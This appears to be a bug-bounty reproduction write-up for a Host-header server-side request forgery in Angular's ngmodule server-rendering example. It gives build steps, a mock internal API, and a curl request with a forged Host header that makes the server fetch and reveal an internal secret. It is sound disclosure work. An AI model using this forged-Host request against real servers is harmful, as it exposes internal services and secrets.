# SSRF repro using stock ngmodule SSR example

Goal: demonstrate Host-header‑driven SSRF using the **stock** ngmodule SSR example (`integration/platform-server/projects/ngmodule`) with minimal/no code changes.

## Setup (terminal A)
From repo root:

```bash
corepack pnpm -C integration/platform-server install
corepack pnpm -C integration/platform-server build:ngmodule
corepack pnpm -C integration/platform-server serve:ngmodule
```

This starts the SSR server at `http://127.0.0.1:4206/`.

If `build:ngmodule` fails with missing `@angular/*`, ensure your `node_modules/@angular/*` resolve to built packages (for this repo, `dist/packages-dist/*`). For example:

```bash
ln -sfn dist/packages-dist/core node_modules/@angular/core
ln -sfn dist/packages-dist/common node_modules/@angular/common
ln -sfn dist/packages-dist/compiler node_modules/@angular/compiler
ln -sfn dist/packages-dist/compiler-cli node_modules/@angular/compiler-cli
ln -sfn dist/packages-dist/platform-browser node_modules/@angular/platform-browser
ln -sfn dist/packages-dist/platform-server node_modules/@angular/platform-server
ln -sfn dist/packages-dist/router node_modules/@angular/router
ln -sfn dist/packages-dist/animations node_modules/@angular/animations
ln -sfn dist/packages-dist/forms node_modules/@angular/forms
```

## Internal mock API (terminal B)
```bash
node BugBounty/Repros/ssrf-stock-ngmodule/internal-api.js
```

This starts an internal server at `http://127.0.0.1:4401/api-2` that returns `{data: "INTERNAL_SECRET_123"}`.

## Exploit demo (terminal C)
Request the route that issues a **relative** HTTP request during SSR:

```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4206/http-transferstate-lazy
```

Expected outcome:
- The SSR HTML contains `INTERNAL_SECRET_123` in the `.two` div.
- This shows SSR resolved `/api-2` against the attacker‑controlled Host header.

## Notes
- This uses Angular’s own ngmodule SSR example (`integration/platform-server/projects/ngmodule/server.ts`), which constructs `url` from `headers.host`.
- No changes to the example are required for the repro.
